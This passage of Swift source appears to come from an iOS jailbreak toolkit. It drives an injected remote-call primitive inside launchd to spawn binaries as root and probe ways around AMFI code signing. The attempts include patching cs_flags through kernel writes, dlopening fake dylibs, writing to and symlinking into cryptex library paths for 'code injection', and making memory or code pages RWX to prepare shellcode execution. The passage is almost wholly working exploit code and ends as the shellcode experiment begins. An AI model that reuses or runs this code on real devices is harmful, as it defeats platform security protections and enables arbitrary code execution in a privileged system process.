            let pathAddr = remote_alloc_str(rc, dir)
            let dirPtr = RootExecutor.rcall(rc, "opendir", pathAddr)
            RootExecutor.rcall(rc, "free", pathAddr)
            
            if dirPtr == 0 {
                allResults.append("\(dir)/: (cannot open)")
                continue
            }
            
            var entries: [String] = []
            for _ in 0..<50 {
                let dirent = RootExecutor.rcall(rc, "readdir", dirPtr)
                if dirent == 0 { break }
                
                var nameBuf = [UInt8](repeating: 0, count: 256)
                rc.remoteRead(dirent + 21, to: &nameBuf, size: 256)
                let name = String(cString: nameBuf + [0])
                
                if name != "." && name != ".." {
                    var dtype: UInt8 = 0
                    rc.remoteRead(dirent + 20, to: &dtype, size: 1)
                    let prefix = dtype == 4 ? "📁" : "  "
                    entries.append("\(prefix) \(name)")
                }
            }
            RootExecutor.rcall(rc, "closedir", dirPtr)
            
            if entries.isEmpty {
                allResults.append("\(dir)/: (empty)")
            } else {
                allResults.append("\(dir)/:")
                allResults.append(contentsOf: entries.map { "  \($0)" })
            }
        }
        
        // Also try to find bin/sh by scanning deeper
        // If we found subdirs, scan them too
        let deeperPaths = [
            "/private/preboot/Cryptexes/OS/usr",
            "/private/preboot/Cryptexes/OS/bin",
            "/private/preboot/Cryptexes/OS/System",
            "/System/Cryptexes/OS/usr",
            "/System/Cryptexes/OS/bin",
            "/System/Cryptexes/OS/System",
        ]
        
        for dir in deeperPaths {
            let pathAddr = remote_alloc_str(rc, dir)
            let dirPtr = RootExecutor.rcall(rc, "opendir", pathAddr)
            RootExecutor.rcall(rc, "free", pathAddr)
            
            if dirPtr == 0 { continue }
            
            var entries: [String] = []
            for _ in 0..<30 {
                let dirent = RootExecutor.rcall(rc, "readdir", dirPtr)
                if dirent == 0 { break }
                
                var nameBuf = [UInt8](repeating: 0, count: 256)
                rc.remoteRead(dirent + 21, to: &nameBuf, size: 256)
                let name = String(cString: nameBuf + [0])
                
                if name != "." && name != ".." {
                    var dtype: UInt8 = 0
                    rc.remoteRead(dirent + 20, to: &dtype, size: 1)
                    let prefix = dtype == 4 ? "📁" : "  "
                    entries.append("\(prefix) \(name)")
                }
            }
            RootExecutor.rcall(rc, "closedir", dirPtr)
            
            if !entries.isEmpty {
                allResults.append("\(dir)/:")
                allResults.append(contentsOf: entries.map { "  \($0)" })
            }
        }
        
        return ExperimentResult(
            name: "list cryptex dirs",
            success: true,
            detail: allResults.joined(separator: "\n"),
            timestamp: Date()
        )
    }
    
    /// Experiment: Verify if posix_spawn ret=0 is real
    /// Write return value to memory and read back (not rely on RC return)
    private func expVerifySpawnReturn(rc: RemoteCall) -> ExperimentResult {
        let mem = rc.trojanMem
        
        // Strategy: call posix_spawn and store return in a known location
        // Then read that location to verify
        
        // First test with a binary we KNOW doesn't exist
        let fakeBin = remote_alloc_str(rc, "/nonexistent_binary_xyz")
        let argvBase = mem + 0x400
        rc[argvBase].setValue64(fakeBin)
        rc[argvBase + 8].setValue64(0)
        let pidAddr = mem + 0x2F0
        rc[pidAddr].setValue64(0)
        
        let fakeRet = RootExecutor.rcall(rc, "posix_spawn", pidAddr, fakeBin, 0, 0, argvBase, 0)
        let fakePid = rc[pidAddr].value32()
        RootExecutor.rcall(rc, "free", fakeBin)
        
        // Now test with /sbin/mount (known to exist)
        let realBin = remote_alloc_str(rc, "/sbin/mount")
        rc[argvBase].setValue64(realBin)
        rc[argvBase + 8].setValue64(0)
        rc[pidAddr].setValue64(0)
        
        let realRet = RootExecutor.rcall(rc, "posix_spawn", pidAddr, realBin, 0, 0, argvBase, 0)
        let realPid = rc[pidAddr].value32()
        
        // If real binary spawned, kill it
        if realPid != 0 {
            RootExecutor.rcall(rc, "kill", UInt64(realPid), 9)
        }
        RootExecutor.rcall(rc, "free", realBin)
        
        // Also try getpid right after to see if we're still in launchd
        let ourPid = RootExecutor.rcall(rc, "getpid")
        
        let detail = """
        Fake binary (/nonexistent): ret=\(fakeRet), pid=\(fakePid)
        Real binary (/sbin/mount):  ret=\(realRet), pid=\(realPid)
        Still in launchd: pid=\(ourPid)
        
        If fake ret≠0 and real ret=0 → posix_spawn return is REAL
        If both ret=0 → RC wrapper always returns 0 (unreliable)
        """
        
        let isReal = fakeRet != realRet || fakeRet != 0
        return ExperimentResult(
            name: "verify spawn return",
            success: isReal,
            detail: detail,
            timestamp: Date()
        )
    }
    
    /// Experiment: Spawn with pipe-based output capture
    /// Instead of file redirect, use pipe() + dup2 pattern
    /// Also: fix PID by using remote memory write directly
    private func expSpawnWithPipe(rc: RemoteCall) -> ExperimentResult {
        let mem = rc.trojanMem
        
        // Strategy: since posix_spawn works (ret=0) but PID isn't captured,
        // and output file is empty, try a different approach:
        // 1. Create a file with known content BEFORE spawn
        // 2. Spawn /bin/df (which we know exists and ret=0)
        // 3. Use posix_spawn_file_actions to redirect stdout
        // 4. Sleep to let process finish
        // 5. Read the output file
        
        // Step 1: Write output file path
        let outFile = "/tmp/.dsp_pipe_test"
        let outAddr = remote_alloc_str(rc, outFile)
        
        // Delete old file if exists
        RootExecutor.rcall(rc, "unlink", outAddr)
        
        // Step 2: Setup file actions — redirect fd 1 (stdout) to file
        let actionsAddr = mem + 0x100
        // posix_spawn_file_actions_t is opaque, typically pointer-sized
        rc[actionsAddr].setValue64(0)
        RootExecutor.rcall(rc, "posix_spawn_file_actions_init", actionsAddr)
        
        // addopen(actions, 1, path, O_WRONLY|O_CREAT|O_TRUNC, 0644)
        RootExecutor.rcall(rc, "posix_spawn_file_actions_addopen",
                          actionsAddr, 1, outAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
        // stderr too
        RootExecutor.rcall(rc, "posix_spawn_file_actions_addopen",
                          actionsAddr, 2, outAddr, UInt64(O_WRONLY | O_CREAT), 0o644)
        
        // Step 3: Spawn /bin/df
        let binAddr = remote_alloc_str(rc, "/bin/df")
        let argvBase = mem + 0x400
        rc[argvBase].setValue64(binAddr)
        rc[argvBase + 8].setValue64(0)
        
        let pidAddr = mem + 0x2E0
        rc[pidAddr].setValue64(0xDEAD) // sentinel to detect if it gets written
        
        let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, binAddr, actionsAddr, 0, argvBase, 0)
        
        // Read PID area (check multiple offsets)
        let pidVal0 = rc[pidAddr].value32()
        let pidVal4 = rc[pidAddr + 4].value32()
        let pidFull = rc[pidAddr].value64()
        
        // Step 4: Wait — since we might not have PID, just sleep
        RootExecutor.rcall(rc, "usleep", 1000000) // 1 second
        
        // Also try waitpid(-1) to reap any child
        let statusAddr = mem + 0x380
        rc[statusAddr].setValue32(0)
        let waitRet = RootExecutor.rcall(rc, "waitpid", UInt64(bitPattern: -1), statusAddr, UInt64(WNOHANG))
        let waitStatus = rc[statusAddr].value32()
        
        // Step 5: Read output file
        let readFd = RootExecutor.rcall(rc, "open", outAddr, UInt64(O_RDONLY), 0)
        var output = ""
        if readFd != UInt64(bitPattern: -1) {
            let bufAddr = mem + 0x800
            let n = RootExecutor.rcall(rc, "read", readFd, bufAddr, 2000)
            if n > 0 && n < 2001 {
                var buf = [UInt8](repeating: 0, count: Int(n))
                rc.remoteRead(bufAddr, to: &buf, size: n)
                output = String(bytes: buf, encoding: .utf8) ?? "(binary \(n)B)"
            }
            RootExecutor.rcall(rc, "close", readFd)
        }
        
        // Cleanup
        RootExecutor.rcall(rc, "unlink", outAddr)
        RootExecutor.rcall(rc, "posix_spawn_file_actions_destroy", actionsAddr)
        RootExecutor.rcall(rc, "free", outAddr)
        RootExecutor.rcall(rc, "free", binAddr)
        
        let detail = """
        posix_spawn ret=\(ret)
        pid area: 0x\(String(format: "%x", pidVal0)) | +4: 0x\(String(format: "%x", pidVal4)) | full: 0x\(String(format: "%llx", pidFull))
        waitpid(-1, WNOHANG): ret=\(waitRet), status=0x\(String(format: "%x", waitStatus))
        output file: \(readFd != UInt64(bitPattern: -1) ? "opened" : "MISSING")
        output (\(output.count) chars): \(output.prefix(300))
        """
        
        return ExperimentResult(
            name: "spawn /bin/df + pipe fix",
            success: !output.isEmpty,
            detail: detail,
            timestamp: Date()
        )
    }
    
    /// Experiment: Scan cryptex usr/libexec for available binaries
    private func expScanCryptexLibexec(rc: RemoteCall) -> ExperimentResult {
        let dirs = [
            "/private/preboot/Cryptexes/OS/usr/libexec",
            "/System/Cryptexes/OS/usr/libexec",
            "/private/preboot/Cryptexes/OS/usr/lib",
            "/System/Cryptexes/OS/usr/lib",
        ]
        
        var allEntries: [String] = []
        
        for dir in dirs {
            let pathAddr = remote_alloc_str(rc, dir)
            let dirPtr = RootExecutor.rcall(rc, "opendir", pathAddr)
            RootExecutor.rcall(rc, "free", pathAddr)
            
            if dirPtr == 0 { continue }
            
            var entries: [String] = []
            for _ in 0..<100 {
                let dirent = RootExecutor.rcall(rc, "readdir", dirPtr)
                if dirent == 0 { break }
                
                var nameBuf = [UInt8](repeating: 0, count: 256)
                rc.remoteRead(dirent + 21, to: &nameBuf, size: 256)
                let name = String(cString: nameBuf + [0])
                
                if name != "." && name != ".." {
                    entries.append(name)
                }
            }
            RootExecutor.rcall(rc, "closedir", dirPtr)
            
            if !entries.isEmpty {
                allEntries.append("\(dir)/ (\(entries.count) items):")
                allEntries.append(contentsOf: entries.prefix(20).map { "  \($0)" })
                if entries.count > 20 {
                    allEntries.append("  ... +\(entries.count - 20) more")
                }
            }
        }
        
        return ExperimentResult(
            name: "cryptex libexec scan",
            success: !allEntries.isEmpty,
            detail: allEntries.isEmpty ? "No entries found" : allEntries.joined(separator: "\n"),
            timestamp: Date()
        )
    }
    
    /// Experiment: Spawn binary with stdout capture via posix_spawn_file_actions
    private func expSpawnWithOutput(rc: RemoteCall, binary: String, args: [String]) -> ExperimentResult {
        let mem = rc.trojanMem
        let outputFile = "/tmp/.dsploit_spawn_out"
        
        // Create output file first
        let outPathAddr = remote_alloc_str(rc, outputFile)
        let outFd = RootExecutor.rcall(rc, "open", outPathAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
        if outFd != UInt64(bitPattern: -1) {
            RootExecutor.rcall(rc, "close", outFd)
        }
        
        // Setup posix_spawn_file_actions to redirect stdout to file
        let fileActionsAddr = mem + 0x100
        RootExecutor.rcall(rc, "posix_spawn_file_actions_init", fileActionsAddr)
        
        // addopen: fd=1 (stdout) → outputFile, O_WRONLY|O_CREAT|O_TRUNC
        RootExecutor.rcall(rc, "posix_spawn_file_actions_addopen", fileActionsAddr, 1, outPathAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
        // Also redirect stderr (fd=2) to same file
        RootExecutor.rcall(rc, "posix_spawn_file_actions_addopen", fileActionsAddr, 2, outPathAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
        
        // Build argv
        let binAddr = remote_alloc_str(rc, binary)
        let argvBase = mem + 0x400
        var argAddrs: [UInt64] = []
        for arg in args {
            let addr = remote_alloc_str(rc, arg)
            argAddrs.append(addr)
        }
        for (i, addr) in argAddrs.enumerated() {
            rc[argvBase + UInt64(i * 8)].setValue64(addr)
        }
        rc[argvBase + UInt64(argAddrs.count * 8)].setValue64(0) // NULL
        
        // Spawn with file_actions
        let pidAddr = mem + 0x2F0
        rc[pidAddr].setValue64(0)
        let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, binAddr, fileActionsAddr, 0, argvBase, 0)
        let pid = rc[pidAddr].value32()
        
        // Wait for process to finish
        if ret == 0 {
            let statusAddr = mem + 0x380
            rc[statusAddr].setValue32(0)
            if pid != 0 {
                RootExecutor.rcall(rc, "waitpid", UInt64(pid), statusAddr, 0)
            } else {
                // PID unknown, wait a bit
                RootExecutor.rcall(rc, "usleep", 500000) // 0.5s
            }
        }
        
        // Read output
        var output = ""
        let readFd = RootExecutor.rcall(rc, "open", outPathAddr, UInt64(O_RDONLY), 0)
        if readFd != UInt64(bitPattern: -1) {
            let bufAddr = mem + 0x800
            let n = RootExecutor.rcall(rc, "read", readFd, bufAddr, 2000)
            if n > 0 && n < 2001 {
                var buf = [UInt8](repeating: 0, count: Int(n))
                rc.remoteRead(bufAddr, to: &buf, size: n)
                output = String(bytes: buf, encoding: .utf8) ?? "(binary \(n)B)"
            }
            RootExecutor.rcall(rc, "close", readFd)
        }
        
        // Cleanup
        RootExecutor.rcall(rc, "unlink", outPathAddr)
        RootExecutor.rcall(rc, "posix_spawn_file_actions_destroy", fileActionsAddr)
        RootExecutor.rcall(rc, "free", outPathAddr)
        RootExecutor.rcall(rc, "free", binAddr)
        for addr in argAddrs { RootExecutor.rcall(rc, "free", addr) }
        
        let success = ret == 0
        let detail = success
            ? "✅ ret=0, pid=\(pid)\nOutput:\n\(output.isEmpty ? "(no output captured)" : output.prefix(500))"
            : "❌ ret=\(ret), errno=\(remote_errno(rc))"
        
        return ExperimentResult(
            name: "spawn \(binary) + capture",
            success: success && !output.isEmpty,
            detail: detail,
            timestamp: Date()
        )
    }
    
    // MARK: - AMFI Bypass Research Experiments
    
    /// Write a minimal Mach-O binary to /tmp and try to spawn it
    /// Tests: does AMFI check signature on newly written files?
    private func expWriteAndSpawn(rc: RemoteCall) -> ExperimentResult {
        let mem = rc.trojanMem
        let testBin = "/tmp/.dsp_test_bin"
        let pathAddr = remote_alloc_str(rc, testBin)
        
        // Write minimal ARM64 binary that just exits
        // This is a valid Mach-O that calls exit(42)
        // mov x0, #42; mov x16, #1; svc #0x80
        let shellcode: [UInt8] = [
            // Mach-O header (minimal)
            0xCF, 0xFA, 0xED, 0xFE, // magic: MH_MAGIC_64
            0x0C, 0x00, 0x00, 0x01, // cputype: ARM64
            0x00, 0x00, 0x00, 0x00, // cpusubtype
            0x02, 0x00, 0x00, 0x00, // filetype: MH_EXECUTE
        ]
        // Actually, writing a proper Mach-O is complex. Instead, just copy
        // an existing binary and try to spawn the copy.
        
        // Strategy: copy /bin/df to /tmp/test_bin, then spawn the copy
        // If copy can be spawned → AMFI doesn't check path, only signature!
        
        // Step 1: Read /bin/df
        let srcAddr = remote_alloc_str(rc, "/bin/df")
        let srcFd = RootExecutor.rcall(rc, "open", srcAddr, UInt64(O_RDONLY), 0)
        
        guard srcFd != UInt64(bitPattern: -1) else {
            RootExecutor.rcall(rc, "free", pathAddr)
            RootExecutor.rcall(rc, "free", srcAddr)
            return ExperimentResult(name: "write+spawn", success: false, detail: "Cannot open /bin/df", timestamp: Date())
        }
        
        // Step 2: Create destination
        let dstFd = RootExecutor.rcall(rc, "open", pathAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
        guard dstFd != UInt64(bitPattern: -1) else {
            RootExecutor.rcall(rc, "close", srcFd)
            RootExecutor.rcall(rc, "free", pathAddr)
            RootExecutor.rcall(rc, "free", srcAddr)
            return ExperimentResult(name: "write+spawn", success: false, detail: "Cannot create /tmp/test_bin", timestamp: Date())
        }
        
        // Step 3: Copy in chunks
        let bufAddr = mem + 0x800
        var totalCopied: UInt64 = 0
        for _ in 0..<100 { // max 100 chunks of 2KB = 200KB
            let n = RootExecutor.rcall(rc, "read", srcFd, bufAddr, 2048)
            if n == 0 || n > 2048 { break }
            RootExecutor.rcall(rc, "write", dstFd, bufAddr, n)
            totalCopied += n
        }
        
        RootExecutor.rcall(rc, "close", srcFd)
        RootExecutor.rcall(rc, "close", dstFd)
        RootExecutor.rcall(rc, "free", srcAddr)
        
        // Step 4: chmod +x
        RootExecutor.rcall(rc, "chmod", pathAddr, 0o755)
        
        // Step 5: Try to spawn the COPY
        let argvBase = mem + 0x400
        rc[argvBase].setValue64(pathAddr)
        rc[argvBase + 8].setValue64(0)
        let pidAddr = mem + 0x2E0
        rc[pidAddr].setValue64(0)
        
        let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, pathAddr, 0, 0, argvBase, 0)
        let pid = rc[pidAddr].value32()
        
        // Cleanup
        if ret == 0 && pid != 0 {
            RootExecutor.rcall(rc, "kill", UInt64(pid), 9)
        }
        // Wait for any child
        RootExecutor.rcall(rc, "usleep", 500000)
        let waitRet = RootExecutor.rcall(rc, "waitpid", UInt64(bitPattern: -1), mem + 0x380, UInt64(WNOHANG))
        
        RootExecutor.rcall(rc, "unlink", pathAddr)
        RootExecutor.rcall(rc, "free", pathAddr)
        
        let detail = """
        Copied /bin/df to /tmp (\(totalCopied) bytes)
        posix_spawn(/tmp/copy): ret=\(ret), pid=\(pid)
        waitpid: \(waitRet)
        
        ret=0 → AMFI accepts copied binaries! (signature travels with file)
        ret≠0 → AMFI checks path or re-validates signature
        """
        
        return ExperimentResult(name: "copy+spawn binary", success: ret == 0, detail: detail, timestamp: Date())
    }
    
    /// Try dlopen of unsigned dylib in launchd context
    private func expDlopen(rc: RemoteCall) -> ExperimentResult {
        // Try loading a system dylib first (should work)
        let sysLib = remote_alloc_str(rc, "/usr/lib/libSystem.B.dylib")
        let sysHandle = RootExecutor.rcall(rc, "dlopen", sysLib, 1) // RTLD_LAZY=1
        RootExecutor.rcall(rc, "free", sysLib)
        
        // Try loading from cryptex
        let cryptexLib = remote_alloc_str(rc, "/private/preboot/Cryptexes/OS/usr/lib/libstdc++.dylib")
        let cryptexHandle = RootExecutor.rcall(rc, "dlopen", cryptexLib, 1)
        RootExecutor.rcall(rc, "free", cryptexLib)
        
        // Write a minimal dylib to /tmp and try to load it
        // For now just test if dlopen works at all
        let fakeLib = remote_alloc_str(rc, "/tmp/.dsp_fake.dylib")
        // Create empty file
        let fd = RootExecutor.rcall(rc, "open", fakeLib, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
        if fd != UInt64(bitPattern: -1) { RootExecutor.rcall(rc, "close", fd) }
        let fakeHandle = RootExecutor.rcall(rc, "dlopen", fakeLib, 1)
        
        // Get dlerror
        let errPtr = RootExecutor.rcall(rc, "dlerror")
        var errStr = "(no error)"
        if errPtr != 0 {
            var errBuf = [UInt8](repeating: 0, count: 200)
            rc.remoteRead(errPtr, to: &errBuf, size: 200)
            errStr = String(cString: errBuf + [0])
        }
        
        RootExecutor.rcall(rc, "unlink", fakeLib)
        RootExecutor.rcall(rc, "free", fakeLib)
        
        let detail = """
        dlopen(/usr/lib/libSystem.B.dylib): \(sysHandle != 0 ? "✅ 0x\(String(format: "%llx", sysHandle))" : "❌ NULL")
        dlopen(cryptex libstdc++): \(cryptexHandle != 0 ? "✅ 0x\(String(format: "%llx", cryptexHandle))" : "❌ NULL")
        dlopen(/tmp/fake.dylib): \(fakeHandle != 0 ? "✅ 0x\(String(format: "%llx", fakeHandle))" : "❌ NULL")
        dlerror: \(errStr.prefix(100))
        
        If system dylib loads → dlopen works in launchd
        If fake dylib loads → AMFI doesn't check dlopen! (huge!)
        """
        
        return ExperimentResult(name: "dlopen test", success: sysHandle != 0, detail: detail, timestamp: Date())
    }
    
    /// Check AMFI-related state: amfi boot-args, proc flags, etc
    private func expAMFIState(rc: RemoteCall) -> ExperimentResult {
        // Check if amfi_get_out_of_my_way is set (boot-arg)
        // Read our proc's cs_flags
        let pid = RootExecutor.rcall(rc, "getpid")
        let csflags = mgr.readCSFlags(pid: Int32(pid))
        
        // Check if we can modify cs_flags of a child process
        // Fork a child, then try to patch its cs_flags via kernel
        let childPid = RootExecutor.rcall(rc, "fork")
        var childCSFlags: UInt32 = 0
        var patchResult = "not attempted"
        
        if childPid != 0 && childPid != UInt64(bitPattern: -1) {
            // Read child's cs_flags
            childCSFlags = mgr.readCSFlags(pid: Int32(childPid))
            
            // Try to patch child's cs_flags to add CS_DEBUGGED | CS_GET_TASK_ALLOW
            let newFlags: UInt32 = childCSFlags | 0x0000800 | 0x0004000 // CS_DEBUGGED | CS_GET_TASK_ALLOW
            let patchOk = mgr.patchCSFlags(pid: Int32(childPid), addFlags: 0x0000800 | 0x0004000)
            patchResult = patchOk.ok ? "✅ patched!" : "❌ \(patchOk.msg)"
            
            // Read back
            let afterFlags = mgr.readCSFlags(pid: Int32(childPid))
            patchResult += " (before=0x\(String(format: "%x", childCSFlags)), after=0x\(String(format: "%x", afterFlags)))"
            
            // Kill child
            RootExecutor.rcall(rc, "kill", childPid, 9)
            RootExecutor.rcall(rc, "waitpid", childPid, rc.trojanMem + 0x380, 0)
        }
        
        let detail = """
        launchd (PID \(pid)) cs_flags: 0x\(String(format: "%x", csflags))
        child cs_flags patch: \(patchResult)
        
        If cs_flags patchable → can mark process as CS_DEBUGGED
        CS_DEBUGGED skips some AMFI checks!
        """
        
        return ExperimentResult(name: "AMFI state + cs_flags patch", success: patchResult.contains("✅"), detail: detail, timestamp: Date())
    }
    
    // MARK: - CoreTrust / Library Hijack Research
    
    /// Try to overwrite a signed cryptex library with custom content
    /// If the overwritten library can still be dlopen'd → code injection!
    private func expLibraryHijack(rc: RemoteCall) -> ExperimentResult {
        let mem = rc.trojanMem
        
        // Target: a small library in cryptex that we can overwrite
        // libLogRedirect.dylib is small and non-critical
        let targetLib = "/private/preboot/Cryptexes/OS/usr/lib/libLogRedirect.dylib"
        let backupPath = "/tmp/.dsp_lib_backup"
        
        let targetAddr = remote_alloc_str(rc, targetLib)
        let backupAddr = remote_alloc_str(rc, backupPath)
        
        // Step 1: Check if we can even write to cryptex path
        let testFd = RootExecutor.rcall(rc, "open", targetAddr, UInt64(O_WRONLY), 0)
        let canWrite = testFd != UInt64(bitPattern: -1)
        if canWrite {
            RootExecutor.rcall(rc, "close", testFd)
        }
        let writeErr = remote_errno(rc)
        
        // Step 2: Try to create a NEW file in cryptex directory
        let newFileAddr = remote_alloc_str(rc, "/private/preboot/Cryptexes/OS/usr/lib/.dsp_test")
        let newFd = RootExecutor.rcall(rc, "open", newFileAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
        let canCreate = newFd != UInt64(bitPattern: -1)
        if canCreate {
            RootExecutor.rcall(rc, "close", newFd)
            RootExecutor.rcall(rc, "unlink", newFileAddr)
        }
        let createErr = remote_errno(rc)
        
        // Step 3: Try symlink in cryptex
        let symlinkTarget = remote_alloc_str(rc, "/tmp/.dsp_fake_lib")
        let symlinkPath = remote_alloc_str(rc, "/private/preboot/Cryptexes/OS/usr/lib/.dsp_link")
        let symlinkRet = RootExecutor.rcall(rc, "symlink", symlinkTarget, symlinkPath)
        let symlinkErr = remote_errno(rc)
        if symlinkRet == 0 {
            RootExecutor.rcall(rc, "unlink", symlinkPath)
        }
        
        RootExecutor.rcall(rc, "free", targetAddr)
        RootExecutor.rcall(rc, "free", backupAddr)
        RootExecutor.rcall(rc, "free", newFileAddr)
        RootExecutor.rcall(rc, "free", symlinkTarget)
        RootExecutor.rcall(rc, "free", symlinkPath)
        
        let detail = """
        Target: \(targetLib)
        Can open for write: \(canWrite ? "✅ YES!" : "❌ NO (errno=\(writeErr))")
        Can create new file: \(canCreate ? "✅ YES!" : "❌ NO (errno=\(createErr))")
        Can create symlink: \(symlinkRet == 0 ? "✅ YES!" : "❌ NO (errno=\(symlinkErr))")
        
        If writable → can replace library content → code injection!
        If symlink works → can redirect library load to our file!
        """
        
        let anySuccess = canWrite || canCreate || symlinkRet == 0
        return ExperimentResult(name: "library hijack (cryptex write)", success: anySuccess, detail: detail, timestamp: Date())
    }
    
    /// Try symlink attack: make /var/jb/lib point to somewhere useful
    /// Then dlopen from /var/jb/lib path
    private func expSymlinkAttack(rc: RemoteCall) -> ExperimentResult {
        let mem = rc.trojanMem
        
        // Strategy: DYLD searches multiple paths for libraries
        // If we can make DYLD look in /var/jb/usr/lib/ we could place our dylib there
        // But AMFI still checks signature...
        
        // Alternative: what about DYLD_INSERT_LIBRARIES?
        // In launchd context, can we set env var and spawn?
        
        // Test: create a file at /var/jb/usr/lib/test.dylib
        // Then try dlopen with that path
        let testLib = "/var/jb/usr/lib/test.dylib"
        let testAddr = remote_alloc_str(rc, testLib)
        
        // Write minimal "dylib" (just MH_MAGIC to see if dlopen even tries)
        let fd = RootExecutor.rcall(rc, "open", testAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
        if fd != UInt64(bitPattern: -1) {
            // Write Mach-O magic + minimal header
            let bufAddr = mem + 0x800
            // MH_MAGIC_64 + CPU_TYPE_ARM64 + MH_DYLIB
            let header: [UInt8] = [
                0xCF, 0xFA, 0xED, 0xFE, // magic
                0x0C, 0x00, 0x00, 0x01, // cputype ARM64
                0x00, 0x00, 0x00, 0x00, // cpusubtype
                0x06, 0x00, 0x00, 0x00, // filetype MH_DYLIB
                0x00, 0x00, 0x00, 0x00, // ncmds
                0x00, 0x00, 0x00, 0x00, // sizeofcmds
                0x85, 0x00, 0x20, 0x00, // flags
                0x00, 0x00, 0x00, 0x00, // reserved
            ]
            var headerCopy = header
            rc.remote_write(bufAddr, from: &headerCopy, size: UInt64(header.count))
            RootExecutor.rcall(rc, "write", fd, bufAddr, UInt64(header.count))
            RootExecutor.rcall(rc, "close", fd)
        }
        
        // Try dlopen
        let handle = RootExecutor.rcall(rc, "dlopen", testAddr, 1)
        let errPtr = RootExecutor.rcall(rc, "dlerror")
        var errStr = ""
        if errPtr != 0 {
            var errBuf = [UInt8](repeating: 0, count: 300)
            rc.remoteRead(errPtr, to: &errBuf, size: 300)
            errStr = String(cString: errBuf + [0])
        }
        
        // Cleanup
        RootExecutor.rcall(rc, "unlink", testAddr)
        RootExecutor.rcall(rc, "free", testAddr)
        
        let detail = """
        Wrote fake dylib to \(testLib)
        dlopen result: \(handle != 0 ? "✅ LOADED! 0x\(String(format: "%llx", handle))" : "❌ NULL")
        dlerror: \(errStr.prefix(200))
        
        Error tells us WHY it failed:
        - "code signature" → AMFI checks signature
        - "not a valid" → format issue (expected)
        - "no suitable image" → DYLD rejects
        """
        
        return ExperimentResult(name: "fake dylib dlopen", success: handle != 0, detail: detail, timestamp: Date())
    }
    
    /// Try to use already-loaded library + overwrite function pointers
    private func expFunctionSwap(rc: RemoteCall) -> ExperimentResult {
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        
        let funcAddr = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, "getuid"))
        let mallocAddr = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, "malloc"))
        
        var canReadFunc = false
        if funcAddr != 0 && ds_isvalid(funcAddr) {
            let val = ds_kread64_safe(funcAddr)
            canReadFunc = val != 0
        }
        
        // mmap RWX
        let mmapAddr = RootExecutor.rcall(rc, "mmap", 0, 0x4000, 7, 0x1002, UInt64(bitPattern: Int64(-1)), 0)
        
        let detail = """
        getuid addr: 0x\(String(format: "%llx", funcAddr))
        malloc addr: 0x\(String(format: "%llx", mallocAddr))
        can read via kernel: \(canReadFunc)
        mmap(RWX): \(mmapAddr != UInt64(bitPattern: -1) ? "✅ 0x\(String(format: "%llx", mmapAddr))" : "❌ FAILED")
        
        If mmap(RWX) works → can write+execute shellcode in launchd!
        This would be FULL arbitrary code execution!
        """
        
        if mmapAddr != UInt64(bitPattern: -1) && mmapAddr != 0 {
            RootExecutor.rcall(rc, "munmap", mmapAddr, 0x4000)
        }
        
        return ExperimentResult(
            name: "mmap RWX + function addrs",
            success: mmapAddr != UInt64(bitPattern: -1) && mmapAddr != 0,
            detail: detail,
            timestamp: Date()
        )
    }
    
    // MARK: - Shellcode Execution Experiments
    
    /// Find a writable region in launchd's executable pages
    /// If we can write to __TEXT, we can inject code without mmap
    private func expFindWritableCodePage(rc: RemoteCall) -> ExperimentResult {
        // Strategy: RemoteCall's trojanMem is in launchd's address space
        // Check if any nearby pages are executable
        // Also: check if we can mprotect existing pages to add PROT_EXEC
        
        let mem = rc.trojanMem
        
        // Test 1: Can we mprotect trojanMem to be executable?
        let pageAddr = mem & ~0x3FFF // align to 16KB page
        let mprotectRet = RootExecutor.rcall(rc, "mprotect", pageAddr, 0x4000, 7) // RWX
        let mprotectErr = remote_errno(rc)
        
        // Test 2: Try to find __TEXT segment of launchd
        // dlsym gives us addresses in executable pages
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        let getpidAddr = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, "getpid"))
        
        // Test 3: Can we write to code page? (probably not — W^X)
        // Read current value at getpid, try write, read back
        var origBytes = [UInt8](repeating: 0, count: 4)
        var canWriteCode = false
        if getpidAddr != 0 {
            rc.remoteRead(getpidAddr, to: &origBytes, size: 4)
            // Try writing (will likely fail silently or crash)
            // DON'T actually write to getpid — just test nearby padding
            let testAddr = getpidAddr + 0x1000 // some offset into padding
            var testByte: UInt8 = 0
            rc.remoteRead(testAddr, to: &testByte, size: 1)
            let origByte = testByte
            testByte = 0x42
            rc.remote_write(testAddr, from: &testByte, size: 1)
            var readBack: UInt8 = 0
            rc.remoteRead(testAddr, to: &readBack, size: 1)
            canWriteCode = (readBack == 0x42)
            // Restore
            if canWriteCode {
                var restore = origByte
                rc.remote_write(testAddr, from: &restore, size: 1)
            }
        }
        
        let detail = """
        trojanMem: 0x\(String(format: "%llx", mem))
        mprotect(trojanMem, RWX): \(mprotectRet == 0 ? "✅ SUCCESS!" : "❌ ret=\(mprotectRet), errno=\(mprotectErr)")
        getpid addr (code page): 0x\(String(format: "%llx", getpidAddr))
        can write to code page: \(canWriteCode ? "✅ YES!" : "❌ NO")
        
        If mprotect RWX works → can make trojanMem executable → shellcode!
        If write to code works → can patch existing code → inject!
        """
        
        return ExperimentResult(
            name: "find writable code page",
            success: mprotectRet == 0 || canWriteCode,
            detail: detail,
            timestamp: Date()
        )
    }
    
    /// SHELLCODE EXECUTION via mprotect'd trojanMem!
    /// trojanMem is already writable. mprotect(RWX) confirmed working.
    /// Write shellcode → call it as function → if returns 42 = FULL CODE EXEC!
    /// ⚠️ MAY CAUSE PANIC if APRR still blocks at hardware level
    private func expShellcodeViaMprotect(rc: RemoteCall) -> ExperimentResult {
        let mem = rc.trojanMem
        
